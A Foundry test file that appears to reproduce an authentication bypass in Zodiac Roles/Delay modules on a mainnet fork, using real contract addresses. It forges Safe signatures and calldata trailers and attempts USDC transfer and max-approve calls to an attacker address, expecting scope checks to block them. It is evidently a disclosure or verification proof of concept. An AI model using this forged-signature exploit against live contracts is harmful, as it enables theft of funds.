// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/// @notice Reproduces the Zodiac Roles v2.1.0 / Delay v1.1.0 ERC-1271
/// revert-data authentication bypass on a live mainnet fork, then checks
/// whether the role scope allows any value-moving call.
contract ZodiacReproTest is Test {
    address constant ROLES = 0xef66973E7590C49475DC3013fA6841D14659BA66;
    address constant AVATAR = 0x12BEEF35025841EFccb77D6EE40df86400Fdb4bB;
    address constant MODULE_SAFE = 0xce3FDCB7497928b82c3B5095B8714afE577070D6;
    address internal ATTACKER;
    address internal FRESH_EOA;
    bytes32 constant GG_PAYROLL = bytes32("gg_payroll");
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function setUp() public {
        vm.createSelectFork(vm.envOr("FORK_RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        ATTACKER = makeAddr("attacker");
        FRESH_EOA = makeAddr("fresh");
        // 12-byte contract that always reverts with the ERC-1271 magic value.
        vm.etch(ATTACKER, hex"631626ba7e6000526004601cfd");
    }

    /// @dev Build calldata for execTransactionWithRole with the forged
    /// 97-byte outer trailer and the forged 129-byte inner Safe signature.
    function _forgedCall(
        address to,
        uint256 value,
        bytes memory inner,
        uint8 operation,
        bytes32 roleKey
    ) internal view returns (bytes memory) {
        bytes memory args = abi.encodeWithSelector(
            0xc6fe8747, // execTransactionWithRole(address,uint256,bytes,uint8,bytes32,bool)
            to,
            value,
            inner,
            operation,
            roleKey,
            false
        );

        // Inner Safe signature blob: r=attacker, s=65, v=0, len=32, data.
        bytes memory safeSig = abi.encodePacked(
            bytes32(uint256(uint160(ATTACKER))),
            uint256(65),
            uint8(0),
            uint256(32),
            bytes32(uint256(0xA11CE))
        );

        uint256 start = args.length;
        bytes32 salt = bytes32(uint256(0x5A17));
        bytes memory trailer = abi.encodePacked(
            salt,
            bytes32(uint256(uint160(MODULE_SAFE))),
            bytes32(start),
            uint8(0)
        );
        return abi.encodePacked(args, safeSig, trailer);
    }

    function _probe(address to, uint256 value, bytes memory inner) internal returns (bool ok, bytes memory ret) {
        bytes memory data = _forgedCall(to, value, inner, 0, GG_PAYROLL);
        vm.prank(FRESH_EOA);
        (ok, ret) = ROLES.call(data);
    }

    function test_repro_auth_bypass_and_scope() public {
        uint256 bal = IERC20(USDC).balanceOf(AVATAR);
        emit log_named_uint("avatar USDC", bal);
        emit log_named_uint("module threshold", _threshold(MODULE_SAFE));

        (bool ok, bytes memory ret) = _probe(
            USDC,
            0,
            abi.encodeWithSelector(IERC20.transfer.selector, ATTACKER, bal)
        );
        emit log_named_string("transfer success", ok ? "TRUE" : "false");
        emit log_named_bytes("revert data", ret);
        // Expected: authentication passes, scope rejects (ConditionViolation).
        assertFalse(ok, "scope unexpectedly permitted USDC transfer");
        assertEq(_selector(ret), bytes4(keccak256("ConditionViolation(uint8,bytes32)")), "unexpected revert");
    }

    function test_repro_approve_blocked() public {
        (bool ok, bytes memory ret) = _probe(
            USDC,
            0,
            abi.encodeWithSelector(IERC20.approve.selector, ATTACKER, type(uint256).max)
        );
        emit log_named_string("approve success", ok ? "TRUE" : "false");
        emit log_named_bytes("revert data", ret);
        assertFalse(ok, "scope unexpectedly permitted USDC approve");
    }

    function _threshold(address safe) internal view returns (uint256 t) {
        (bool ok, bytes memory ret) = safe.staticcall(abi.encodeWithSelector(0xe75235b8));
        if (ok && ret.length >= 32) t = abi.decode(ret, (uint256));
    }

    function _selector(bytes memory b) internal pure returns (bytes4 s) {
        if (b.length >= 4) {
            assembly {
                s := mload(add(b, 32))
            }
        }
    }
}
